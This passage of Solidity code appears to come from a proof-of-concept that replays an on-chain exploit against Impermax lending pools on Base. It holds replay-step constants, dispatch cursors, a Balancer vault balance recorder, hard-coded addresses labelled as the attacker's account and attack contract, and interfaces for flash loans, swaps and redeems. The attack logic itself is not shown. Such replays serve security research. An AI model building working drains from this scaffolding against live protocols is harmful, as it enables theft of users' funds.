        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_98");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_99 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_99");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_100 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_100");
    bytes32 private constant REPLAY_RUN_EXPLOIT_PATH2 = keccak256("poc.replay.REPLAY_RUN_EXPLOIT_PATH2");
    mapping(bytes32 => bool) private _replayDone;

    mapping(bytes4 => uint256) private _dispatchCursor;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextDispatch(bytes4 sig) internal returns (uint256 ordinal) {
        ordinal = _dispatchCursor[sig];
        _dispatchCursor[sig] = ordinal + 1;
    }

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_1C450D_F608 = 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608;
    address internal constant A_2CE631_D779 = 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779;
    address internal constant WETH = 0x4200000000000000000000000000000000000006;
    address internal constant imxB = 0x5d93f216f17c225a8B5fFA34e74B7133436281eE;
    address internal constant A_77EB9C_16C1 = 0x77eB9cEca49b87Cf52D4F0c4e8fC9F86cBDD16C1;
    address internal constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address internal constant attack_contract = 0x98E938899902217465f17CF0B76d12B3DCa8CE1b;
    address internal constant NFT_UNI_V3 = 0xa68F6075ae62eBD514d1600cb5035fa0E2210ef8;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant A_BBBBBB_FFCB = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address internal constant imxB_DA59 = 0xbC303aCdA8B2a0dCD3D17F05aDDdF854eDd6da59;
    address internal constant imxC = 0xc1D49fa32d150B31C4a5bf1Cbf23Cf7Ac99eaF7d;
    address internal constant A_D0B53D_F224 = 0xd0b53D9277642d899DF5C87A3966A349A798F224;
    address internal constant A_D30805_5C59 = 0xd3080518e5678DC5464B7D4079d1046929985C59;
    address internal constant attacker_eoa = 0xE3223f7E3343c2C8079f261D59ee1e513086C7C3;
    address internal constant A_E9F853_24CD = 0xE9f853d2616ac6b04E5fC2B4Be6EB654b9F224Cd;
}

interface IPrimaryPool {
    function mint(address, int24, int24, uint128, bytes calldata) external;
    function slot0() external view;
    function swap(address, bool, int256, uint160, bytes calldata) external;
    function tickSpacing() external view returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMorphoFlashLoan {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface IExitPool {
    function slot0() external view;
    function swap(address, bool, int256, uint160, bytes calldata) external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface INftUniV3 {
    function redeem(address, uint256) external;
    function reinvest(uint256, address) external;
}

interface IWETHLike {
    function withdraw(uint256) external;
}

interface IImpermaxBorrow {
    function debtCeiling() external view returns (uint256);
    function exchangeRate() external returns (uint256);
    function redeem(address) external returns (uint256);
    function totalBorrows() external view returns (uint256);
}

interface IImpermaxColl {
    function liquidationPenalty() external view returns (uint256);
    function redeem(address, uint256, uint256) external returns (uint256);
    function safetyMarginSqrt() external view returns (uint256);
}
